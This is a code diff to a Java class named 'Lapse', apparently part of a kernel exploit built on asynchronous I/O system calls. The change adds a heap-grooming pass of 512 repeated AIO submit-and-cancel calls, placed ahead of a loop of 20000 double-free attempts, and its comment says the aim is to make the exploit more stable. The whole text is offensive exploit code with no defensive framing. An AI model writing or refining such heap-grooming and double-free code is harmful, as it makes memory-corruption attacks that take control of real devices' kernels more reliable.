@@ -104,8 +104,15 @@ public class Lapse extends Thread {
 		long aliasRthdrBufAddr = 0;
 
 		// Bare minimum initialization to succeed in calling aio_submit_cmd()
-		for (int i = 0; i < NUM_AIO_REQUESTS; i++) {
-			reqs.get(i).fd.set(-1);
+		for (int i = 0; i < reqs.count; i++) { reqs.get(i).fd.set(-1); } // make_reqs1
+
+		// Initial heap grooming (maybe this will make the exploit more stable?)
+		final int NUM_GROOM_TRIES = 512;
+		AioSubmitIdArray groomIds = k.new AioSubmitIdArray(NUM_AIO_REQUESTS);
+		Console.log("Lapse: initial heap grooming pass");
+		for (int i = 0; i < NUM_GROOM_TRIES; i++) {
+			k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_READ, reqs, groomIds);
+			k.aioMultiCancel(groomIds, null);
 		}
 
 		final int NUM_DOUBLE_FREE_TRIES = 20000;
